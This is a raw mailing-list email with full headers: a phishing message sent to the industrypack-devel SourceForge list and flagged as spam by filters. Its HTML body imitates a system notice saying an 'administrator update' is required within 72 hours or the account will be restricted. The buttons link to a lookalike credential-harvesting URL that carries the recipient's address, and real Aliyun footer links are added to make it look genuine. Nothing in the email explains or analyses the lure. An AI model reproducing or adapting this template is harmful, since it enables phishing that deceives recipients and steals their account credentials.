Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id +El+L6RYpmmJOQAAu9opvQ
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	for <lists+industrypack-devel@lfdr.de>; Tue, 03 Mar 2026 04:42:28 +0100
X-Original-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 0E6E01E886E
	for <lists+industrypack-devel@lfdr.de>; Tue, 03 Mar 2026 04:42:28 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=9isKmSpue06CaEwTIxDoJ09dn6KFkAxsJCC+5XMZOQ0=; b=JasSQy9bLeOdwAoPs7Zm1Dn9fQ
	JhG8PEcxDoN1KXOZf+GviJ3nFYyLjxpUX/HdK5T0PsFHOgE99r8C7eNnc3gfg0pKlU7pYuILlz8Xt
	nttklvr49nv26TBPsDpV6v/ggvo125UiJJCatr0AhRC6iIlh0SRQS8vWYbJoaggF6quo=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1vxGeQ-000574-ED
	for lists+industrypack-devel@lfdr.de;
	Tue, 03 Mar 2026 03:42:26 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <test@mynet.pk>) id 1vxGeP-00056t-G7
 for industrypack-devel@lists.sourceforge.net;
 Tue, 03 Mar 2026 03:42:25 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Type:MIME-Version:Message-ID:Date:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=tN8nSx66Nj6nP6ky1imH08xRO1SSF91iqpaqrcwClyA=; b=HybgksXEWsUlLemr/W44sts4We
 30zifjbulgSKG1Adpgj+202yr1mEgFOBut+sWaaI5rrcU9dfqW6gMWTGWZWPHQ34hRsCOjQdFVjcp
 r62H0UtTttfTtnAzs5mJckPB4aPw/83YUGw1LNTeaFOr/Rzo6wE5ZXLFPZNeJSgH2y/0=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Type:MIME-Version:Message-ID:Date:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=tN8nSx66Nj6nP6ky1imH08xRO1SSF91iqpaqrcwClyA=; b=c
 xB8rlaPFbzsRJ7g9R1dod2wE/E6yuVd9c68zN0VpjCU6XI0q7x51VzrVlnAYKoVco4SGpWVtYCv7F
 MbFpnKjuvOavsrrOvO+quUzEpEj+J4/3uI2JuoaILFaX4ZbnpDfoujbF/gr6sNnopHghnZ1dwF212
 xw+jm+K0FOUEfx9g=;
Received: from [103.156.136.15] (helo=cp.mynet.pk)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1vxGeO-00062G-6J for industrypack-devel@lists.sourceforge.net;
 Tue, 03 Mar 2026 03:42:25 +0000
Received: from mynet.pk (ec2-3-36-49-156.ap-northeast-2.compute.amazonaws.com
 [3.36.49.156])
 (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 (No client certificate requested)
 by cp.mynet.pk (Postfix) with ESMTPSA id D89EA427D98D
 for <industrypack-devel@lists.sourceforge.net>;
 Tue,  3 Mar 2026 08:24:39 +0500 (PKT)
From: LISTS  <test@mynet.pk>
To: industrypack-devel@lists.sourceforge.net
Date: 03 Mar 2026 03:24:39 +0000
Message-ID: <20260303032439.43148AF12A8CE508@mynet.pk>
MIME-Version: 1.0
X-Spam-Score: 6.6 (++++++)
X-Spam-Report: Spam detection software, running on the system "sfi-spamd-2.hosts.colo.sdot.me",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  System notification – requires administrator intervention
    Administrator update required 
 
 Content analysis details:   (6.6 points, 5.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.5 SUBJ_ALL_CAPS          Subject is all capitals
  0.1 MXG_EMAIL_FRAG         BODY: URI with email in fragment
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
  0.5 TO_NO_BRKTS_HTML_IMG   To: lacks brackets and HTML and one image
  1.7 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
  2.4 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
                             [cf: 100]
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1vxGeO-00062G-6J
Subject: [Industrypack-devel] [SPAM] UPDATE REQUIRED
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============7741499492170099320=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net
X-Rspamd-Queue-Id: 0E6E01E886E
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [3.99 / 15.00];
	SPAM_FLAG(5.00)[];
	RWL_MAILSPIKE_EXCELLENT(-0.40)[216.105.38.7:from];
	R_DKIM_ALLOW(-0.20)[lists.sourceforge.net:s=beta];
	R_SPF_ALLOW(-0.20)[+ip4:216.105.38.7:c];
	MAILLIST(-0.20)[mailman];
	MANY_INVISIBLE_PARTS(0.10)[2];
	MIME_GOOD(-0.10)[multipart/mixed,multipart/related,text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_TLS_LAST(0.00)[];
	R_DKIM_REJECT(0.00)[sourceforge.net:s=x,sf.net:s=x];
	MIME_TRACE(0.00)[0:+,1:+,2:~,3:~,4:+,5:+];
	RCPT_COUNT_ONE(0.00)[1];
	RECEIVED_HELO_LOCALHOST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	ARC_NA(0.00)[];
	DKIM_MIXED(0.00)[];
	DMARC_NA(0.00)[mynet.pk];
	DKIM_TRACE(0.00)[lists.sourceforge.net:+,sourceforge.net:-,sf.net:-];
	ASN(0.00)[asn:11320, ipnet:216.105.32.0/21, country:US];
	MISSING_XM_UA(0.00)[];
	TO_DN_NONE(0.00)[];
	PREVIOUSLY_DELIVERED(0.00)[industrypack-devel@lists.sourceforge.net];
	FROM_NEQ_ENVFROM(0.00)[test@mynet.pk,industrypack-devel-bounces@lists.sourceforge.net];
	FROM_HAS_DN(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	NEURAL_HAM(-0.00)[-0.238];
	TAGGED_RCPT(0.00)[industrypack-devel];
	HAS_DATA_URI(0.00)[];
	MID_RHS_MATCH_FROM(0.00)[];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[lists.sourceforge.net:dkim,lists.sourceforge.net:rdns,lists.sourceforge.net:helo,aliyun.com:url]
X-Rspamd-Action: no action


--===============7741499492170099320==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_A56F19CE.2DF6547B"


------=_NextPart_000_0012_A56F19CE.2DF6547B
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body style=3D"MARGIN: 0.5em">
<P>
<table style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT=
: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(246,246,246); font-variant-ligat=
ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
ration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" a=
lign=3D"center" bgcolor=3D"#f6f6f6" border=3D"0">
<TBODY>
<TR>
<td style=3D"MARGIN: 0px" align=3D"center">
<table style=3D"BORDER-TOP: rgb(224,224,224) 1px solid; BORDER-RIGHT: rgb(2=
24,224,224) 1px solid; BORDER-BOTTOM: rgb(224,224,224) 1px solid; BORDER-LE=
FT: rgb(224,224,224) 1px solid; MARGIN: 20px auto; BACKGROUND-COLOR: rgb(25=
5,255,255); border-radius: 4px; border-image: none 100% / 1 / 0 stretch" ce=
llspacing=3D"0" cellpadding=3D"0" width=3D"580" align=3D"center" bgcolor=3D=
"#ffffff" border=3D"0">
<TBODY>
<TR>
<td style=3D"BACKGROUND: none transparent scroll repeat 0% 0%; BORDER-BOTTO=
M: rgb(255,229,143) 1px solid; MARGIN: 0px" bgcolor=3D"#fff8eb" height=3D"6=
0" align=3D"center">
<DIV style=3D"HEIGHT: 60px; WIDTH: 578px; BACKGROUND-IMAGE: url(data:image/=
svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRo=
PSI0MCIgaGVpZ2h0PSI0MCIgdmlld0JveD0iMCAwIDQwIDQwIj48cGF0aCBkPSJNMjAgM0wzIDM=
zbDE3LTUgMTcgNS0xNy0zeiIgZmlsbD0iI2ZmYzEwMCIgb3BhY2l0eT0iMC4yIi8+PC9zdmc+);=
 LEFT: 0px; TOP: 0px; opacity: 0.03"></DIV><SPAN style=3D'FONT-SIZE: 18px; =
FONT-FAMILY: "Microsoft YaHei", &#24494;&#36719;&#38597;&#40657;, Arial, sa=
ns-serif; COLOR: rgb(51,51,51); Z-INDEX: 1'>
<FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inhe=
rit">System notification &#8211; requires administrator intervention</FONT>=
</FONT></SPAN></TD></TR>
<TR>
<td style=3D"PADDING-BOTTOM: 40px; PADDING-TOP: 40px; PADDING-LEFT: 30px; M=
ARGIN: 0px; PADDING-RIGHT: 30px">
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
<TBODY>
<TR>
<td style=3D"PADDING-BOTTOM: 30px; MARGIN: 0px" align=3D"center">
<DIV style=3D"HEIGHT: 64px; WIDTH: 64px; MARGIN: 0px auto 20px; DISPLAY: fl=
ex; BACKGROUND-COLOR: rgb(255,242,232); border-radius: 50%; justify-content=
: center; align-items: center"><SPAN style=3D"FONT-SIZE: 32px; COLOR: rgb(2=
50,140,22)"><img aria-label=3D"?" class=3D"an1" style=3D"HEIGHT: 1.2em; WID=
TH: 1.2em; VERTICAL-ALIGN: middle" alt=3D"?" src=3D"cid:72.png" loading=3D"=
lazy" draggable=3D"false" data-emoji=3D"?" width=3D"72" height=3D"72"></SPA=
N></DIV>
<H2 style=3D'FONT-SIZE: 20px; FONT-FAMILY: "Microsoft YaHei", &#24494;&#367=
19;&#38597;&#40657;, Arial, sans-serif; FONT-WEIGHT: 500; COLOR: rgb(51,51,=
51); MARGIN: 0px 0px 15px'><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT st=
yle=3D"VERTICAL-ALIGN: inherit">Administrator update required</FONT></FONT>=
</H2>
<P style=3D'FONT-SIZE: 14px; FONT-FAMILY: "Microsoft YaHei", &#24494;&#3671=
9;&#38597;&#40657;, Arial, sans-serif; COLOR: rgb(102,102,102); MARGIN: 0px=
 0px 10px; LINE-HEIGHT: 1.6'><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT =
style=3D"VERTICAL-ALIGN: inherit">Due to the latest security requirements, =
your account needs to undergo an administrator-level update.</FONT></FONT><=
/P>
<P style=3D'FONT-SIZE: 14px; FONT-FAMILY: "Microsoft YaHei", &#24494;&#3671=
9;&#38597;&#40657;, Arial, sans-serif; FONT-WEIGHT: bold; COLOR: rgb(102,10=
2,102); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDING-LEFT: 12px; MARGIN=
: 0px; LINE-HEIGHT: 1.6; PADDING-RIGHT: 12px; BACKGROUND-COLOR: rgb(255,244=
,229); border-radius: 4px'><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT st=
yle=3D"VERTICAL-ALIGN: inherit">
Note: Please complete this update within 72 hours, otherwise your account m=
ay be restricted from access.</FONT></FONT></P></TD></TR></TBODY></TABLE>
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
<TBODY>
<TR>
<td style=3D"PADDING-TOP: 30px; MARGIN: 0px" align=3D"center">
<table style=3D"MARGIN: 0px auto" cellspacing=3D"0" cellpadding=3D"0" borde=
r=3D"0">
<TBODY>
<TR>
<td style=3D"MARGIN: 0px; PADDING-RIGHT: 10px" align=3D"center"><A style=3D=
'FONT-SIZE: 14px; FONT-FAMILY: "Microsoft YaHei", &#24494;&#36719;&#38597;&=
#40657;, Arial, sans-serif; COLOR: rgb(255,255,255); PADDING-BOTTOM: 10px; =
PADDING-TOP: 10px; PADDING-LEFT: 24px; DISPLAY: inline-block; PADDING-RIGHT=
: 24px; BACKGROUND-COLOR: rgb(24,144,255); border-radius: 4px; text-decorat=
ion-line: none' href=3D"http://flotuschits.com/gfddddfg/fgggg/chameleonx/ch=
ameleonx/#industrypack-devel@lists.sourceforge.net">
<FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inhe=
rit">Update soon</FONT></FONT></A></TD>
<td style=3D"MARGIN: 0px" align=3D"center">
<A style=3D'FONT-SIZE: 14px; BORDER-TOP: rgb(24,144,255) 1px solid; FONT-FA=
MILY: "Microsoft YaHei", &#24494;&#36719;&#38597;&#40657;, Arial, sans-seri=
f; BORDER-RIGHT: rgb(24,144,255) 1px solid; BORDER-BOTTOM: rgb(24,144,255) =
1px solid; COLOR: rgb(24,144,255); PADDING-BOTTOM: 10px; PADDING-TOP: 10px;=
 PADDING-LEFT: 24px; BORDER-LEFT: rgb(24,144,255) 1px solid; DISPLAY: inlin=
e-block; PADDING-RIGHT: 24px; border-radius: 4px; border-image: none 100% /=
 1 / 0 stretch; text-decoration-line: none'=20
href=3D"http://flotuschits.com/gfddddfg/fgggg/chameleonx/chameleonx/#indust=
rypack-devel@lists.sourceforge.net"><FONT style=3D"VERTICAL-ALIGN: inherit"=
><FONT style=3D"VERTICAL-ALIGN: inherit">check the details</FONT></FONT></A=
></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</TD></TR>
<TR>
<td style=3D"BORDER-TOP: rgb(240,240,240) 1px solid; PADDING-BOTTOM: 20px; =
PADDING-TOP: 20px; PADDING-LEFT: 30px; MARGIN: 0px; PADDING-RIGHT: 30px; BA=
CKGROUND-COLOR: rgb(250,250,250)">
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 12px; FONT-FAMILY: &quot;Microsoft YaHei&quot;, ???=
?, Arial, sans-serif; COLOR: rgb(153,153,153); MARGIN: 0px; LINE-HEIGHT: 1.=
5" align=3D"center">
<P style=3D"MARGIN: 0px 0px 8px"><FONT style=3D"VERTICAL-ALIGN: inherit"><F=
ONT style=3D"VERTICAL-ALIGN: inherit">This email was sent automatically by =
the system; please process it promptly.</FONT></FONT></P>
<P style=3D"MARGIN: 0px"><A style=3D"COLOR: rgb(153,153,153); text-decorati=
on-line: none" href=3D"https://help.aliyun.com/admin"><FONT style=3D"VERTIC=
AL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">Admin Help<SPAN>=
&nbsp;</SPAN></FONT></FONT></A><SPAN style=3D"COLOR: rgb(221,221,221); MARG=
IN: 0px 8px"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICA=
L-ALIGN: inherit">|<SPAN>&nbsp;</SPAN></FONT></FONT></SPAN>
 <A style=3D"COLOR: rgb(153,153,153); text-decoration-line: none" href=3D"h=
ttps://account.aliyun.com/unsubscribe"><FONT style=3D"VERTICAL-ALIGN: inher=
it"><FONT style=3D"VERTICAL-ALIGN: inherit">Unsubscribe</FONT></FONT></A></=
P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></T=
ABLE></P>
<DIV style=3D"FONT-SIZE: small; OVERFLOW: hidden; HEIGHT: 0px; FONT-FAMILY:=
 Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT=
-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: norma=
l; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-va=
riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
th: 0px; text-decoration-thickness: initial; text-decoration-style: initial=
; text-decoration-color: initial">
<SPAN style=3D"COLOR: transparent"></SPAN><SPAN style=3D"COLOR: transparent=
"></SPAN></DIV></BODY></HTML>
------=_NextPart_000_0012_A56F19CE.2DF6547B
Content-Type: image/png; name="72.png"
Content-Transfer-Encoding: base64
Content-ID: <72.png>

iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAEY0lEQVR4AeyZA7AjSxhGn1F6
VuEase3k2bZt20bp2bZt27Zt2/q3e/FVzaSnk1VXd6ZTdXbvveGcOjONzGL+zd7s7efLZxlg
XMB4gPEB4wbGapPutXISjB8YJOACK2hSMSRhNT/L2YxBHfjAt4J+uWqOD/68Y1H658Eh+vv+
fvrj1oW8JG3mOzl/3bXEZv8/HSd6NuXgv8eC9MuVs9uKmIwPGCSA1+TXiiBnMwbJ+PWauQQV
2XpsRR3qsRWhno/WJvpkfaLnc7aitnreXp7op904XJKtyFEPL+aHnSCI/WyvRY56PlgdciDI
XovE9bhPMZ9WJK4HvFSyIxqvh4uQ1+PPilAPl+G69mCIf/GqHB20U4WazSZxtt6wRhceW/JD
RagHYsAHqxM/6DvOzFOj0RDCpelbkYJ6fnkkTSstX4cQEXeckde0IgX18IOv1+tSdt1CfUXa
XHsuOLpAtVpNyi5blHvvWoR6Xql51sO5/YwcVatVKbtsXuq9EQ31fLm5Zz2c56/MdhS0MwT1
SEWo57WWrB4IqlQqUo7eo6B6XqRBPRCUoXK5LOW8o/I9M7uW1/P28sKDLJVKUs47Uv1+kfp6
vt2OH9A0CToXghRWpEE9oFgsSnno/IwGazT19YDVV8xToVDw5LkrIEhdRRrUA7bfONdBUNr8
lT7q+XqrruuBoI1ylM/nPXn7RggysyLUw0tx1/Pm0h0PbLuNspTL5bwwfb8I9fBanHK+3Lyr
Azv78Axls1kv8DgjK0I9vBR3Pa+1uhN0WLqTIHMrQj3vriypR85ZTFAmkxGywWq4/phZEb4l
famEU4xfqLGk6IJbTklROp0Wss36EGReRahnOnn28hSlUmK2Xh+PM68i1MOvPx+szk+zaRN0
mbegPbbA44yqCPW4tlOnSdIzTFAymRRy5iFJPM6oilDPay3pfk+3JBIJIRBkUEWoh4OvkjtO
DOXE43EhZ0CQORWhHockXtIrNfxtRgm6/xwIMqMi1DODWa4Vo1isnWcuhSAzKkI9M5gt1o5R
NBp1A0FaVqSgHrD5WjGKRCJtvHk9BOlXkYJ6wGZrRUWCcL+WFSmoBxy3e4zC4bAb3K9lRQrq
AacdGKNQKOQG92tZkYJ6wNOXJCgYDDrYf5so7te2IgX1gBtOiFMuPUnOThtF6OeHcYHWtiLU
YyYKKkI9+qO+IpX18NPpmN0ilE0FKRAI0Carh+mN6xI6VgQ586usZ+PVQjQ+Pu4gmwzQp3ck
dasIgg5TJed1VopLDthv67BuFaGeH1QJeuriOI2NjQnZaNWgftcihfWgoNHRUSFH7RJWP6Jp
VA/YcJUAjYyMOEjFR9k1KKHXiKa4HvDTw0naZ8sgJWOT5Ky85BgrK67XvEh9PcbMiyBoN7/J
kVT0gkjQA34V9NddS7RVJBL0AllBwBYkF/SDfO3lM369bl63oMO8RrIbyNbzAmPCBPC1hQqG
e3YDnjoDPpLn2yYBeJaCHg9WwEBVMApGAQBeMburYu7LtgAAAABJRU5ErkJggg==

------=_NextPart_000_0012_A56F19CE.2DF6547B--



--===============7741499492170099320==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7741499492170099320==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============7741499492170099320==--


